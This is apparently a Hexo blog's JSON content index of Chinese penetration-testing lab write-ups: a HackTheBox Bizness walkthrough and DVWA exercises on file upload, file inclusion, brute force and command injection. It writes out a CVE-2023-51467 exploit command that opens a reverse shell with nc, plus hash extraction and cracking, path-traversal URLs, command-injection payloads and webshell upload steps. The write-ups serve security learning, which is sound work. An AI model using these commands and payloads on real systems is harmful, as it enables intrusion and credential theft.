{"meta":{"title":"Hexo","subtitle":"","description":"","author":"Mini Full","url":"http://example.com","root":"/"},"pages":[{"title":"404","date":"2021-11-05T10:15:10.000Z","updated":"2021-11-05T10:16:37.893Z","comments":false,"path":"404/index.html","permalink":"http://example.com/404/index.html","excerpt":"","text":""},{"title":"分类","date":"2021-11-05T09:39:57.000Z","updated":"2021-11-11T02:46:13.564Z","comments":false,"path":"categories/index.html","permalink":"http://example.com/categories/index.html","excerpt":"","text":""},{"title":"about","date":"2021-11-05T10:08:34.000Z","updated":"2021-11-05T10:09:07.176Z","comments":false,"path":"about/index.html","permalink":"http://example.com/about/index.html","excerpt":"","text":""},{"title":"friends","date":"2021-11-05T10:13:49.000Z","updated":"2021-11-05T10:13:49.522Z","comments":false,"path":"friends/index.html","permalink":"http://example.com/friends/index.html","excerpt":"","text":""},{"title":"标签","date":"2021-11-05T09:49:44.000Z","updated":"2021-11-11T02:46:28.767Z","comments":false,"path":"tags/index.html","permalink":"http://example.com/tags/index.html","excerpt":"","text":""}],"posts":[{"title":"HackTheBox靶场之Bizness","slug":"HackTheBox靶场之Bizness","date":"2024-05-11T09:10:43.000Z","updated":"2024-05-13T08:52:20.120Z","comments":true,"path":"2024/05/11/HackTheBox靶场之Bizness/","link":"","permalink":"http://example.com/2024/05/11/HackTheBox%E9%9D%B6%E5%9C%BA%E4%B9%8BBizness/","excerpt":"","text":"HackTheBox靶场之Bizness0x01 信息收集启动机器 使用nmap对IP进行扫描 12345678nmap -sS -A -sC -sV -p- --min-rate 6000 10.10.11.252-sS 使用TCP SYN扫描（也称为半开放扫描），扫描单个主机上的所有TCP端口-A 检测远程主机上运行的操作系统和版本-sC 扫描一个主机的所有TCP端口，同时使用默认脚本扫描，脚本在Nmap的安装目录下的scripts目录中-sV 检测打开的端口以确认服务/版本信息-p- 全端口扫描--min-rate 让nmap以不小于每秒6000次的速率进行扫描，数字越大速度越快 得到一个 biziness.htb 的域名，添加到hosts 1echo &quot;10.10.11.252 bizness.htb&quot; | sudo tee -a /etc/hosts 然后打开80端口查看结果 也可以使用curl命令访问，只是看到的内容是源代码的方式 123curl -k https://bizness.htb-k 表示允许不安全链接 80端口就只看到一个邮箱加电话信息以外（也不一定能用到），基本没啥信息 尝试目录扫描 1dirsearch -u https://bizness.htb/ 在结果中发现两个意思后台登录的页面，访问后发现都是一个登录框 里面有很多信息，ofbiz，右下角有个18.12版本信息 0x02 web渗透测试首先应该是尝试弱口令和密码爆破（但是我现在太菜，还没系统了解），所以直接跳过了 直接网上搜索对应版本的漏洞 发现存在漏洞CVE-2023-51467，直接下载POC 然后检测是否存在漏洞 发现可能存在漏洞，继续利用POC中的命令执行进行反弹shell 1python3 exploit.py --url https://bizness.htb/ --cmd &#x27;nc -c sh IP地址 端口&#x27; 反弹成功 修改显示方式 1python3 -c &quot;import pty;pty.spawn(&#x27;/bin/bash&#x27;)&quot;; 尝试在此权限下看能不能找到flag文件，最终在 /home/ofbiz 目录下找到 user.txt查看后发现就是我们需要的内容 0x03 提权在常规的提权中有suid提权和内核版本提权（但是我现在还不会，后面会补充） 通过查看大佬文章，Apache PFBiz组件包含了数据库，因此直接尝试从数据库中搜索敏感信息 12cd /opt/ofbiz/runtime/data/derby/ofbiz/seg0grep -arin -o -E &#x27;(\\w+\\W+)&#123;0,5&#125;password(\\W+\\w+)&#123;0,5&#125;&#x27; 通过查看HASh的文章发现，图中$表示的是SHA系列，然后**$d**应该是用于增加哈希值复杂度的盐，后面部分的编码应该就是SHA处理过的值，所以需要先进行解密 使用cyberchef对后半段字符串进行base64解密成16进制的字符串 因为我们的哈希是加了盐，所以直接使用kali自带的 hashcat 对它进行爆破 将我们解密的值加上盐d，写入一个txt文档中 然后使用命令进行爆破 1hashcat -m 120 -a 0 /usr/share/wordlists/rockyou.txt 爆破得到密码是monkeybizness，直接提权，成功在 /root目录下找到 root flag","categories":[{"name":"靶机渗透","slug":"靶机渗透","permalink":"http://example.com/categories/%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F/"}],"tags":[{"name":"实战","slug":"实战","permalink":"http://example.com/tags/%E5%AE%9E%E6%88%98/"}]},{"title":"HackTheBox靶场之Usage","slug":"HackTheBox靶场之Usage","date":"2024-05-11T07:28:49.000Z","updated":"2024-05-11T09:11:16.132Z","comments":true,"path":"2024/05/11/HackTheBox靶场之Usage/","link":"","permalink":"http://example.com/2024/05/11/HackTheBox%E9%9D%B6%E5%9C%BA%E4%B9%8BUsage/","excerpt":"","text":"HackTheBox靶场之Usage0x01 信息收集","categories":[{"name":"靶机渗透","slug":"靶机渗透","permalink":"http://example.com/categories/%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F/"}],"tags":[{"name":"实战","slug":"实战","permalink":"http://example.com/tags/%E5%AE%9E%E6%88%98/"}]},{"title":"kfc杯9","slug":"kfc杯9","date":"2024-04-15T07:04:42.000Z","updated":"2024-04-16T13:15:04.550Z","comments":true,"path":"2024/04/15/kfc杯9/","link":"","permalink":"http://example.com/2024/04/15/kfc%E6%9D%AF9/","excerpt":"","text":"0x01 环境简述 目标不明，需要进行信息搜集 我这里使用的是一个在线信息搜集工具（http://z.zcjun.com/）加sitescan 0x02 实战环节 目标1：http://doc.hackme.cc/ 此站点存在任意文件上传漏洞","categories":[{"name":"靶机渗透","slug":"靶机渗透","permalink":"http://example.com/categories/%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F/"}],"tags":[{"name":"实战","slug":"实战","permalink":"http://example.com/tags/%E5%AE%9E%E6%88%98/"}]},{"title":"DVWA之不安全验证","slug":"DVWA之不安全验证","date":"2024-02-27T04:51:28.000Z","updated":"2024-02-27T04:51:28.750Z","comments":true,"path":"2024/02/27/DVWA之不安全验证/","link":"","permalink":"http://example.com/2024/02/27/DVWA%E4%B9%8B%E4%B8%8D%E5%AE%89%E5%85%A8%E9%AA%8C%E8%AF%81/","excerpt":"","text":"","categories":[],"tags":[]},{"title":"DVWA之XSS已存储","slug":"DVWA之XSS已存储","date":"2024-02-27T04:51:13.000Z","updated":"2024-02-27T04:51:13.093Z","comments":true,"path":"2024/02/27/DVWA之XSS已存储/","link":"","permalink":"http://example.com/2024/02/27/DVWA%E4%B9%8BXSS%E5%B7%B2%E5%AD%98%E5%82%A8/","excerpt":"","text":"","categories":[],"tags":[]},{"title":"DVWA之XSS反射","slug":"DVWA之XSS反射","date":"2024-02-27T04:50:58.000Z","updated":"2024-02-27T04:50:58.687Z","comments":true,"path":"2024/02/27/DVWA之XSS反射/","link":"","permalink":"http://example.com/2024/02/27/DVWA%E4%B9%8BXSS%E5%8F%8D%E5%B0%84/","excerpt":"","text":"","categories":[],"tags":[]},{"title":"DVWA之SQL注入（盲注）","slug":"DVWA之SQL注入（盲注）","date":"2024-02-27T04:50:45.000Z","updated":"2024-02-27T04:50:45.288Z","comments":true,"path":"2024/02/27/DVWA之SQL注入（盲注）/","link":"","permalink":"http://example.com/2024/02/27/DVWA%E4%B9%8BSQL%E6%B3%A8%E5%85%A5%EF%BC%88%E7%9B%B2%E6%B3%A8%EF%BC%89/","excerpt":"","text":"","categories":[],"tags":[]},{"title":"DVWA之SQL注入","slug":"DVWA之SQL注入","date":"2024-02-27T04:50:27.000Z","updated":"2024-02-27T04:50:28.000Z","comments":true,"path":"2024/02/27/DVWA之SQL注入/","link":"","permalink":"http://example.com/2024/02/27/DVWA%E4%B9%8BSQL%E6%B3%A8%E5%85%A5/","excerpt":"","text":"","categories":[],"tags":[]},{"title":"DVWA之文件上传","slug":"DVWA之文件上传","date":"2024-02-27T04:50:14.000Z","updated":"2024-04-18T07:25:56.756Z","comments":true,"path":"2024/02/27/DVWA之文件上传/","link":"","permalink":"http://example.com/2024/02/27/DVWA%E4%B9%8B%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/","excerpt":"","text":"File Upload一、 漏洞原理 文件上传漏洞定义 文件上传漏洞是web系统中常见的一种功能，通过文件上传能实现上传图片、视频，以及其他类型的文件，但是随着web中包含的功能越来越多，潜在的网络安全风险也越大。 如果恶意用户上传了可执行的文件或脚本，就会导致网站被其控制甚至会使服务器沦陷，以至于引发恶意的网络安全事件。 文件上传漏洞原理 文件上传漏洞是指用户通过界面上的上传功能上传了一个可执行的脚本文件，而web端的系统并未对其进行检测或者检测的逻辑不够好。 总的来说文件上传功能是没有问题的，主要是服务器如何对上传的文件进行处理。 若web未对用户上传的文件进行有效的审查，若存在恶意用户对其上传一句话木马，从而实现控制web网站的目的。 文件上传思路 3.1 常规类 扫描获取上传，会员中心头像上传，后台系统上传，其他途径上传。 3.2 cms类 已知道的cms源码。 3.3 编辑类 ckeditor、fackditor、kinededitor、xxxxeditor 二、 靶场实战1. LOW代码审计12345678910111213141516171819&lt;?phpif( isset( $_POST[ &#x27;Upload&#x27; ] ) ) &#123; // Where are we going to be writing to? $target_path = DVWA_WEB_PAGE_TO_ROOT . &quot;hackable/uploads/&quot;; $target_path .= basename( $_FILES[ &#x27;uploaded&#x27; ][ &#x27;name&#x27; ] ); // Can we move the file to the upload folder? if( !move_uploaded_file( $_FILES[ &#x27;uploaded&#x27; ][ &#x27;tmp_name&#x27; ], $target_path ) ) &#123; // No echo &#x27;&lt;pre&gt;Your image was not uploaded.&lt;/pre&gt;&#x27;; &#125; else &#123; // Yes! echo &quot;&lt;pre&gt;&#123;$target_path&#125; succesfully uploaded!&lt;/pre&gt;&quot;; &#125;&#125;?&gt; 可以看到代码对上传的文件是没有任何限制和过滤的，存在明显的上传漏洞，成功上传后为提示路径 + succesfully uploaded 上传失败则会提示 your image was not uploaded 漏洞复现上传一个包含一句话木马的php，我们可以发现上传成功。 使用蚁剑连接木马，木马也成功连接 2. Medium代码审计12345678910111213141516171819202122232425262728293031323334&lt;?phpif( isset( $_POST[ &#x27;Upload&#x27; ] ) ) &#123; // Where are we going to be writing to? $target_path = DVWA_WEB_PAGE_TO_ROOT . &quot;hackable/uploads/&quot;; $target_path .= basename( $_FILES[ &#x27;uploaded&#x27; ][ &#x27;name&#x27; ] ); // File information $uploaded_name = $_FILES[ &#x27;uploaded&#x27; ][ &#x27;name&#x27; ]; $uploaded_type = $_FILES[ &#x27;uploaded&#x27; ][ &#x27;type&#x27; ]; $uploaded_size = $_FILES[ &#x27;uploaded&#x27; ][ &#x27;size&#x27; ]; // Is it an image? if( ( $uploaded_type == &quot;image/jpeg&quot; || $uploaded_type == &quot;image/png&quot; ) &amp;&amp; ( $uploaded_size &lt; 100000 ) ) &#123; // Can we move the file to the upload folder? if( !move_uploaded_file( $_FILES[ &#x27;uploaded&#x27; ][ &#x27;tmp_name&#x27; ], $target_path ) ) &#123; // No echo &#x27;&lt;pre&gt;Your image was not uploaded.&lt;/pre&gt;&#x27;; &#125; else &#123; // Yes! echo &quot;&lt;pre&gt;&#123;$target_path&#125; succesfully uploaded!&lt;/pre&gt;&quot;; &#125; &#125; else &#123; // Invalid file echo &#x27;&lt;pre&gt;Your image was not uploaded. We can only accept JPEG or PNG images.&lt;/pre&gt;&#x27;; &#125;&#125;?&gt; 这里可以看到，首先是使用$_files函数获取上传文件的信息 然后使用 if 语句判断上传类型是否为图片类型 jpeg/png，并且文件大小是小于10000字节（约等于100M） 当我们依然上传上一道题的aa.php时，页面显示上传文件类型不正确。 方法1：burp抓包 直接上传 aa.php 文件 使用burp抓取上传的数据包 将Content-Type类型改为 image/png 点击 Forward 放包后发现文件上传成功 使用蚁剑连接 连接成功 方法2：使用 cmd 命令制造图片木马与文件包含漏洞 使用xxd(Linux命令之xxd命令主要用来查看文件对应的十六进制形式，也可以讲文件对应的十六进制形式输出到一个指定的文件。使用此命令所支持的特有选项，亦可以以二进制的形式查看文件)查看十六进制的第一行数据，可发现后缀为.png的图片前几个字符为8950 4e47，因此可通过前几个字符来判断是否为后缀.png的图片,同时我们可以伪造一张图片，保证十六进制数据的前几个字符为8950 4e47，在数据中插入一些恶意代码，从而实现getimagesize的绕过。 windows直接使用 copy命令制作图片木马 新建一个写入一句话木马的 aa.php（也可以是txt） 文档，然后创建一个 aa.png 的图片，将图片和 php文档放入同一个文件夹中，在文件地址处打开cmd命令行 在cmd命令行中输入 copy aa.png/b + aa.p/a 1.jpg，即可制作一个文件名为 1.jpg的图片木马。 通过文件包含漏洞对我们上传的1.jpg文件进行解析，同时获取新的木马文件 3. High代码审计123456789101112131415161718192021222324252627282930313233343536373839&lt;?phpif( isset( $_POST[ &#x27;Upload&#x27; ] ) ) &#123; // Where are we going to be writing to? $target_path = DVWA_WEB_PAGE_TO_ROOT . &quot;hackable/uploads/&quot;; $target_path .= basename( $_FILES[ &#x27;uploaded&#x27; ][ &#x27;name&#x27; ] ); // File information $uploaded_name = $_FILES[ &#x27;uploaded&#x27; ][ &#x27;name&#x27; ]; $uploaded_ext = substr( $uploaded_name, strrpos( $uploaded_name, &#x27;.&#x27; ) + 1); //substr函数提取字符串长度，strrpos函数统计“.”出现的最后位置，然后加一 $uploaded_size = $_FILES[ &#x27;uploaded&#x27; ][ &#x27;size&#x27; ]; $uploaded_tmp = $_FILES[ &#x27;uploaded&#x27; ][ &#x27;tmp_name&#x27; ]; //已上传文件在服务器端保存的临时文件名，包含路径 // Is it an image? if( ( strtolower( $uploaded_ext ) == &quot;jpg&quot; || strtolower( $uploaded_ext ) == &quot;jpeg&quot; || strtolower( $uploaded_ext ) == &quot;png&quot; ) &amp;&amp; //strtolower函数将大小字母转换为小写 ( $uploaded_size &lt; 100000 ) &amp;&amp; getimagesize( $uploaded_tmp ) ) &#123; // Can we move the file to the upload folder? if( !move_uploaded_file( $uploaded_tmp, $target_path ) ) &#123; // No echo &#x27;&lt;pre&gt;Your image was not uploaded.&lt;/pre&gt;&#x27;; &#125; else &#123; // Yes! echo &quot;&lt;pre&gt;&#123;$target_path&#125; succesfully uploaded!&lt;/pre&gt;&quot;; &#125; &#125; else &#123; // Invalid file echo &#x27;&lt;pre&gt;Your image was not uploaded. We can only accept JPEG or PNG images.&lt;/pre&gt;&#x27;; &#125;&#125;?&gt; 第一个 if语句 对上传文件的类型进行了检测，只能上传图片 然后 getimagesize 函数会获取图像的大小和格式，这样用来防止通过抓包改后缀的攻击方式","categories":[],"tags":[{"name":"DVWA","slug":"DVWA","permalink":"http://example.com/tags/DVWA/"}]},{"title":"DVWA之文件包含","slug":"DVWA之文件包含","date":"2024-02-27T04:50:03.000Z","updated":"2024-04-17T11:49:23.361Z","comments":true,"path":"2024/02/27/DVWA之文件包含/","link":"","permalink":"http://example.com/2024/02/27/DVWA%E4%B9%8B%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/","excerpt":"","text":"File Inclusion一、漏洞原理 什么是文件包含 程序开发人员通常会把可重复使用的函数写到单个文件中，在使用某些函数时，直接调用此文件，无需再次编写，这种调用文件的过程一般被称为文件包含。 文件包含漏洞的形成原因 随着网站业务的需求，程序开发人员一般希望代码更灵活，所以将被包含的文件设置为变量，用来进行动态调用，但是正是这种灵活性通过动态变量的方式引入需要包含的文件时，用户对这个变量可控而且服务端有没有做合理的校验或者校验被绕过就造成的文件包含漏洞。 文件包含漏洞简介 File Inclusion，文件包含（漏洞），是指当服务器开启 allow_url_include 选项时，就可以通过php的某些特性函数（include()，require()和incluede_once()，require_once()） 利用url去动态包含文件，此时如果没有对文件来源进行严格审查，就会导致文件读取或者任意命令执行。 require()：可以包含文件，如果包含错了，直接报错并推出程序的运行 include()：在包含的过程中如果出现错误，会抛出一个警告，程序会正常运行 require_once()：与require类似，区别在于当重复调用同一个文件时，程序只调用一次 include_once()：与include类似，区别在于当重复调用同一个文件时，程序只调用一次 文件包含漏洞类型 本地文件包含与远程文件包含漏洞 远程文件包含漏洞是因为开启了php配置中的 allow_url_fopen 选项（选项开启之后，服务器允许包含一个远程的文件） 类型 为协议、file、phpinput:// 二、 靶场实战1. LOW1.1 代码审计直接使用get方式传参，可以直接对资源进行访问，没有任何拦截 1234567&lt;?php// The page we wish to display$file = $_GET[ &#x27;page&#x27; ];?&gt; 1.2 漏洞复现1.2.1 本地文件包含 依次点击三个文件 可以看到URL中仅仅是 page= 后的参数发生变化 因此可以将page后的参数视为可控字段，一次进行实验 使用一个不存在的php文件进行测试 测试语句： 1http://ip:端口号/vulnerabilities/fi/?page=test.php 可以发现还爆出了文件的路径 测试语句： 1http://ip:端口号/vulnerabilities/fi/?page=../../php.ini 注：因为文件位于fi文件夹下，距离根目录还有2层，所以可以使用../../进行 跨目录读取 成功回显 测试语句： 1http://ip:端口号/vulnerabilities/fi/?page=../../phpinfo.php 这表明了文件上传漏洞不仅仅能够读文件，还能执行文件，尝试从本地包含文件 先通过文件上传漏洞，传给他一个图片木马，然后在使用文件包含解析它 一句话木马，当我们执行这句木马的时候，他就会创建一个shell.php的文件，里面就是一句话木马。","categories":[],"tags":[{"name":"DVWA","slug":"DVWA","permalink":"http://example.com/tags/DVWA/"}]},{"title":"DVWA之跨站请求伪造","slug":"DVWA之跨站请求伪造","date":"2024-02-27T04:49:51.000Z","updated":"2024-02-27T04:49:51.519Z","comments":true,"path":"2024/02/27/DVWA之跨站请求伪造/","link":"","permalink":"http://example.com/2024/02/27/DVWA%E4%B9%8B%E8%B7%A8%E7%AB%99%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0/","excerpt":"","text":"","categories":[],"tags":[]},{"title":"DVWA之暴力破解","slug":"DVWA之暴力破解","date":"2024-02-27T04:48:52.000Z","updated":"2024-02-27T08:40:54.729Z","comments":true,"path":"2024/02/27/DVWA之暴力破解/","link":"","permalink":"http://example.com/2024/02/27/DVWA%E4%B9%8B%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3/","excerpt":"","text":"Brute Force漏洞原理​ 暴力破解的原理就是使用攻击者自己的用户名和密码字典，一个一个去枚举，尝试是否能够登录。因为理论上来说，只要字典足够庞大，枚举总是能够成功的！在web攻击中，一般会使用这种手段对应用系统的认证信息进行获取。 产生原因1. Web应用开发时用户身份认证的方法有逻辑漏洞 1. Web用户身份识别策略不严格或设置不当 1. Web应用对用户身份和密码没有做强制性的限制 1. Web应用没有对用户不常用的登录地址做异常访问处理 1. Web应用开发时，用户身份认证方式有缺陷或权限分配不合理 防御措施 使用强密码 设定密码策略 多重身份验证 网络流量监测 锁定用户 使用防火墙 靶场实战LOW代码分析1234567891011121314151617181920212223242526272829303132&lt;?phpif( isset( $_GET[ &#x27;Login&#x27; ] ) ) &#123; // Get username $user = $_GET[ &#x27;username&#x27; ]; // Get password $pass = $_GET[ &#x27;password&#x27; ]; // 将提交的password参数进行md5散列 $pass = md5( $pass ); // Check the database $query = &quot;SELECT * FROM `users` WHERE user = &#x27;$user&#x27; AND password = &#x27;$pass&#x27;;&quot;; $result = mysql_query( $query ) or die( &#x27;&lt;pre&gt;&#x27; . mysql_error() . &#x27;&lt;/pre&gt;&#x27; ); if( $result &amp;&amp; mysql_num_rows( $result ) == 1 ) &#123; // Get users details $avatar = mysql_result( $result, 0, &quot;avatar&quot; ); // Login successful echo &quot;&lt;p&gt;Welcome to the password protected area &#123;$user&#125;&lt;/p&gt;&quot;; echo &quot;&lt;img src=\\&quot;&#123;$avatar&#125;\\&quot; /&gt;&quot;; &#125; else &#123; // Login failed echo &quot;&lt;pre&gt;&lt;br /&gt;Username and/or password incorrect.&lt;/pre&gt;&quot;; &#125; mysql_close();&#125;?&gt; 根据代码分析，可以发现是没有任何防止爆破保护措施的，允许攻击者尝试他期望尝试的此处而不受影响e 函数分析 md5 将字符串进行md5散列（也就是md5加密） 语法：md5(string，raw) 参数：string 必需。规定要计算的字符串 ​ raw 可选。规定十六进制或二进制输出格式 mysql_query()函数 执行一条 MySQL函数 语法：mysql_query(query,connection) 参数：query 必需。规定要发送的 SQL 查询。注释：查询字符串不应以分号结束 ​ connection 可选。规定 SQL 连接标识符。如果未规定，则使用上一个打开的连接 die函数 输出一条消息，并退出当前脚本 语法：die(massage) ​ massage 必需。规定在推出脚本之前写入的消息或状态号。状态号不会被写入输出 mysql_error函数 返回上一个 MySQL 操作产生的文本错误信息 语法：mysql_error(connection) ​ connection 可选。规定SQL连接标识符。如果未规定，则使用上一个打开的连接 mysql_num_rows函数 返回结果集中行的数目 语法：mysql_num_rows(data) 参数：data 必需。结果集。该结果集从 mysql_query()的调用中得到 mysql_close() 函数 函数关闭非持久的 MySQL 连接 语法：mysql_close(link_identifier) 参数：link_identifier 必需。MySQL的连接标识符 构建攻击先随便尝试一个用户名以及密码（用户名：aaa 密码：bbb） 提示我们用户名或密码错误 我们使用burp抓包，尝试爆破密码。浏览器中配置好代理，burp配置好抓包端口。在登录框随便输入用户名和密码，进行抓包 抓包成功后，点击Action（或右键）选择Send to Intruder 在Intruder界面，左侧点击clear，如下图 然后分别选择要爆破的内容点击Add，这里分别是admin和admin，也就是登录界面输入的账号、密码。注意选择内容的先后顺序，关系到对应的选择字典顺序。 在Positions页面Attack type栏选择Cluster bomb（集数炸弹） 在 Payloads 页面的 payload sets 栏设置payload set 里选择1，即第一个参数对应的就是账号，payload type 选择 simple list。 然后在 Payload settings 点击 load 选择我们提前准备好的字典 重复以上操作，只是 paload set处选择2，设置密码的枚举。其他设置不变。 设置完成以后点击 Start attack 开始攻击 接下来就是等待攻击结束 在 Results 页面中，根据Status和length值来判断是否成功，一般攻击成功的参数都会和其他不一样，所以通过对status和length的排序，查看不一样的值 这里就爆破出一组账号密码， admin/password。手工登录验证成功。 这里一共五组账号密码，我只爆出了一组，我准备的字典里没有其他四组账号密码的字符串，字典在爆破里面是很重要的。 Medium代码分析123456789101112131415161718192021222324252627282930313233343536&lt;?phpif( isset( $_GET[ &#x27;Login&#x27; ] ) ) &#123; // Sanitise username input $user = $_GET[ &#x27;username&#x27; ]; //把输入的username转义为SQL中使用的字符串中的特殊字符 $user = mysql_real_escape_string( $user ); // Sanitise password input $pass = $_GET[ &#x27;password&#x27; ]; $pass = mysql_real_escape_string( $pass ); $pass = md5( $pass ); // Check the database $query = &quot;SELECT * FROM `users` WHERE user = &#x27;$user&#x27; AND password = &#x27;$pass&#x27;;&quot;; $result = mysql_query( $query ) or die( &#x27;&lt;pre&gt;&#x27; . mysql_error() . &#x27;&lt;/pre&gt;&#x27; ); if( $result &amp;&amp; mysql_num_rows( $result ) == 1 ) &#123; // Get users details $avatar = mysql_result( $result, 0, &quot;avatar&quot; ); // Login successful echo &quot;&lt;p&gt;Welcome to the password protected area &#123;$user&#125;&lt;/p&gt;&quot;; echo &quot;&lt;img src=\\&quot;&#123;$avatar&#125;\\&quot; /&gt;&quot;; &#125; else &#123; // Login failed //延迟执行两秒 sleep( 2 ); echo &quot;&lt;pre&gt;&lt;br /&gt;Username and/or password incorrect.&lt;/pre&gt;&quot;; &#125; mysql_close();&#125;?&gt; 整段代码看下来，只是在LOW等级上添加了登录失败休眠，只要登录失败一次就需要等待两秒才能登录。同样可以使用burp抓包爆破，只是时间会相对增加。 函数分析 mysql_real_escape_string函数 用来转义[ SQL](https://baike.baidu.com/item/ SQL/86007?fromModule=lemma_inlink) 语句中使用的字符串中的特殊字符 语法：mysql_real_escape_string(string,connection) 参数：string 必需。规定要转义的字符串 ​ connection 可选。规定 MySQL连接。如果未规定，默认使用上一个连接 sleep函数 延迟执行当前脚本若干秒 语法：sleep(seconds) 参数：seconds 必需。规定延迟执行脚本的秒数 High代码分析12345678910111213141516171819202122232425262728293031323334353637383940414243444546&lt;?phpif( isset( $_GET[ &#x27;Login&#x27; ] ) ) &#123; // Check Anti-CSRF token // 设置反CSRF（跨站请求伪造） checkToken( $_REQUEST[ &#x27;user_token&#x27; ], $_SESSION[ &#x27;session_token&#x27; ], &#x27;index.php&#x27; ); // Sanitise username input $user = $_GET[ &#x27;username&#x27; ]; //用于删除 username 中的反斜杠 $user = stripslashes( $user ); $user = mysql_real_escape_string( $user ); // Sanitise password input $pass = $_GET[ &#x27;password&#x27; ]; $pass = stripslashes( $pass ); $pass = mysql_real_escape_string( $pass ); $pass = md5( $pass ); // Check database $query = &quot;SELECT * FROM `users` WHERE user = &#x27;$user&#x27; AND password = &#x27;$pass&#x27;;&quot;; $result = mysql_query( $query ) or die( &#x27;&lt;pre&gt;&#x27; . mysql_error() . &#x27;&lt;/pre&gt;&#x27; ); if( $result &amp;&amp; mysql_num_rows( $result ) == 1 ) &#123; // Get users details $avatar = mysql_result( $result, 0, &quot;avatar&quot; ); // Login successful echo &quot;&lt;p&gt;Welcome to the password protected area &#123;$user&#125;&lt;/p&gt;&quot;; echo &quot;&lt;img src=\\&quot;&#123;$avatar&#125;\\&quot; /&gt;&quot;; &#125; else &#123; // Login failed // 随机睡眠0~3秒 sleep( rand( 0, 3 ) ); echo &quot;&lt;pre&gt;&lt;br /&gt;Username and/or password incorrect.&lt;/pre&gt;&quot;; &#125; mysql_close();&#125;// Generate Anti-CSRF tokengenerateSessionToken();?&gt; 在High等级中添加了反CSRF，登录失败后不能登录的时间随机0~3秒，同样可以使用burp爆破，只是时间问题。","categories":[],"tags":[{"name":"DVWA","slug":"DVWA","permalink":"http://example.com/tags/DVWA/"}]},{"title":"DVWA之命令注入","slug":"DVWA之命令注入","date":"2024-02-22T07:07:12.000Z","updated":"2024-02-27T05:03:34.627Z","comments":true,"path":"2024/02/22/DVWA之命令注入/","link":"","permalink":"http://example.com/2024/02/22/DVWA%E4%B9%8B%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5/","excerpt":"","text":"Command Injection漏洞原理​ Command Injection，即命令注入，是指通过提交恶意构造的参数破坏命令语句结构，从而达到执行恶意命令的目的。PHP命令注入攻击漏洞是PHP应用程序中常见的脚本漏洞之一。 产生原因 外部参数可控 应用程序调用了执行系统命令的函数，比如服务器程序通过system、eval、exec等函数直接或者间接地调用了cmd.exe。 内部拼接命令 服务器将输入的恶意参数拼接到正常命令中，从而执行命令造成攻击。 漏洞危害​ 黑客如果能够利用命令执行漏洞，那么黑客就可以像电脑用于控制自己电脑一样，自由地对电脑进行操作，比如开启防火墙、添加路由、开启远程服务等等操作。 防御措施 设计时尽可能少设计使用一些命令执行函数 若有必要使用，那么必须对特殊函数做过滤，对用户输入的命令做检查，对客户端提交的变量在进入执行命令前做好过滤和检查等。 靶场实战LOW代码分析1234567891011121314151617181920212223242526272829&lt;?php//通过POST方式提交请求if( isset( $_POST[ &#x27;Submit&#x27; ] ) ) &#123; // Get input //请求输入的IP地址 $target = $_REQUEST[ &#x27;ip&#x27; ]; // Determine OS and execute the ping command. //判断操作系统为linux还是windows系统 //stristr函数查找“windows NT”第一次出现的地方 //php_uname函数返回运行PHP函数的操作系统信息 if( stristr( php_uname( &#x27;s&#x27; ), &#x27;Windows NT&#x27; ) ) &#123; // Windows //shell_exec函数：通过 shell 执行命令并将完整的输出以字符串的方式返回 $cmd = shell_exec( &#x27;ping &#x27; . $target ); &#125; else &#123; // *nix //shell_exec函数：通过 shell 执行命令并将完整的输出以字符串的方式返回 $cmd = shell_exec( &#x27;ping -c 4 &#x27; . $target ); &#125; // Feedback for the end user //打印 $cmd 的数据 echo &quot;&lt;pre&gt;&#123;$cmd&#125;&lt;/pre&gt;&quot;;&#125;?&gt; 函数解析： isset()函数 用于检查变量是否已设置并且非NULL 语法： isset ($var) ​ $var：要检测的变量 stristr函数 搜索字符串在另一字符串中的第一次出现 语法：stristr(string,search,before_search) ​ string：必需。规定被搜索的字符串。 ​ search：必需。规定所搜索的字符串。 ​ before_search：可选。一个默认值为”false”的布尔值。 php_uname函数 返回运行PHP的操作系统的相关描述 语法：php_uname ([$mode=”a”]) ​ mode 是单个字符，用于定义要返回什么信息： ​ ‘a’：此为默认。包含序列 “s n r v m” 里的所有模式。 ​ ’s’：操作系统名称。例如： FreeBSD。 ​ ‘n’：主机名。例如： localhost.example.com。 ​ ‘r’：版本名称，例如： 5.1.2-RELEASE。 ​ ‘v’：版本信息。操作系统之间有很大的不同。 ​ ‘m’：机器类型。例如：i386。 shell_exec函数 通过shell执行命令并以字符串的形式返回完整的输出。 构建payload根据代码分析可以发现，代码中是无任何过滤的，用户端可以直接拼接特定的命令，来执行并获取想要的信息。 可以用以下命令来拼接输入的命令：可以拼接所有的命令执行函数 1234A&amp;B //A后台运行，A和B同时执行A&amp;&amp;B //A执行成功后才执行BA|B //A执行的输出结果作为B命令的参数，A不论正确与否，都会执行BA||B //A执行失败后才执行B命令 123456即：127.0.0.1&amp;ipconfig（其他也可以）127.0.0.1&amp;&amp;ipconfig(可以其他命令)127.0.0.1|ipconfig(可以其他命令)127.0.0.1||ipconfig(可以其他命令) Medium代码分析1234567891011121314151617181920212223242526272829303132333435&lt;?phpif( isset( $_POST[ &#x27;Submit&#x27; ] ) ) &#123; // Get input $target = $_REQUEST[ &#x27;ip&#x27; ]; // Set blacklist //将&amp;&amp;和;复制为空，这里相当于过滤 $substitutions = array( &#x27;&amp;&amp;&#x27; =&gt; &#x27;&#x27;, &#x27;;&#x27; =&gt; &#x27;&#x27;, ); // Remove any of the charactars in the array (blacklist). //在array_keys函数中查找$substitutions名的值，也就是“&amp;&amp;”和“;” //str_replace函数中找找array_keys函数返回的键名，也就是“&amp;&amp;”和“;”。然后执行$substitutions变量的值，只要匹配到“&amp;&amp;”或“;”值就会被替换为空值。规定搜索$target变量 $target = str_replace( array_keys( $substitutions ), $substitutions, $target ); // Determine OS and execute the ping command. //php_uname函数中返回运行PHP的操作系统信息 //stristr函数根据php_uname函数返回的值，匹配“windows NT”值第一次出现的地方，如果有就代表是windows系统，则执行if语句，反之则执行else语句 if( stristr( php_uname( &#x27;s&#x27; ), &#x27;Windows NT&#x27; ) ) &#123; // Windows $cmd = shell_exec( &#x27;ping &#x27; . $target ); &#125; else &#123; // *nix $cmd = shell_exec( &#x27;ping -c 4 &#x27; . $target 